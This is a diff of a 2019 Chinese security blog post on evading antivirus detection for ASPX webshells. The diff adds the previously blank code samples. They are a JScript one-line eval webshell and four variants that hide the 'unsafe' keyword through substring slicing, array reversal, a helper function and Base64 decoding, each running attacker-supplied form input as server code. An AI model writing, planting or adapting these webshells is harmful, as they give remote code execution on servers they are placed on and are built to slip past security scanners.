@@ -34,7 +34,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/yzddmr6.com\/posts\/webshell-venom-aspx\/"
-        },"genre": "posts","keywords": "免杀, webshell-venom","wordcount":  985 ,
+        },"genre": "posts","keywords": "免杀, webshell-venom","wordcount":  1031 ,
         "url": "https:\/\/yzddmr6.com\/posts\/webshell-venom-aspx\/","datePublished": "2019-08-11T22:27:11+00:00","dateModified": "2019-08-11T22:27:11+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -156,7 +156,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 985 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1031 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -215,7 +215,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34;%&gt; &lt;%                                    %&gt;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34;%&gt; &lt;%eval(Request.Item[&#34;pass&#34;],&#34;unsafe&#34;);%&gt;
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>其实与php的类似
@@ -264,13 +264,19 @@ Eval函数将字符串当做代码执行
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
-</span></span><span class="line"><span class="cl">&lt;%
-</span></span><span class="line"><span class="cl">                                                                                                
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s2">&#34;Jscript&#34;</span> <span class="n">Debug</span><span class="o">=</span><span class="bp">true</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">a</span><span class="o">=</span><span class="n">Request</span><span class="o">.</span><span class="n">Form</span><span class="p">(</span><span class="s2">&#34;mr6&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">b</span><span class="o">=</span><span class="s1">&#39;aaaunsaaaafe&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">b</span><span class="o">=</span><span class="n">b</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">b</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x03-数组" class="headerLink">
@@ -281,30 +287,50 @@ Eval函数将字符串当做代码执行
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
-</span></span><span class="line"><span class="cl">&lt;%
-</span></span><span class="line"><span class="cl">                                                                                             
-</span></span><span class="line"><span class="cl">%&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s2">&#34;Jscript&#34;</span> <span class="n">Debug</span><span class="o">=</span><span class="bp">true</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">a</span><span class="o">=</span><span class="s1">&#39;efasnu&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">b</span><span class="o">=</span><span class="n">Request</span><span class="o">.</span><span class="n">Form</span><span class="p">(</span><span class="s2">&#34;mr6&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">c</span><span class="o">=</span><span class="n">a</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">a</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x04-函数" class="headerLink">
     <a href="#0x04-%e5%87%bd%e6%95%b0" class="header-mark"></a>6 0x04 函数</h2><p>因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
-</span></span><span class="line"><span class="cl">&lt;%
-</span></span><span class="line"><span class="cl">                                                                                                       
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s2">&#34;Jscript&#34;</span> <span class="n">Debug</span><span class="o">=</span><span class="bp">true</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">a</span><span class="o">=</span><span class="n">Request</span><span class="o">.</span><span class="n">Form</span><span class="p">(</span><span class="s2">&#34;mr6&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">ok</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">c</span><span class="o">=</span><span class="s2">&#34;un&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">b</span><span class="o">=</span><span class="s2">&#34;safe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">c</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">ok</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x05-base64编码" class="headerLink">
@@ -325,13 +351,17 @@ Eval函数将字符串当做代码执行
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
-</span></span><span class="line"><span class="cl">&lt;%
-</span></span><span class="line"><span class="cl">                                                                                                                                                 
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s2">&#34;Jscript&#34;</span> <span class="n">Debug</span><span class="o">=</span><span class="bp">true</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">a</span><span class="o">=</span><span class="n">Request</span><span class="o">.</span><span class="n">Form</span><span class="p">(</span><span class="s2">&#34;mr6&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">res</span><span class="o">=</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">GetEncoding</span><span class="p">(</span><span class="mi">65001</span><span class="p">)</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">&#39;dW5zYWZl&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">res</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x06-总结" class="headerLink">
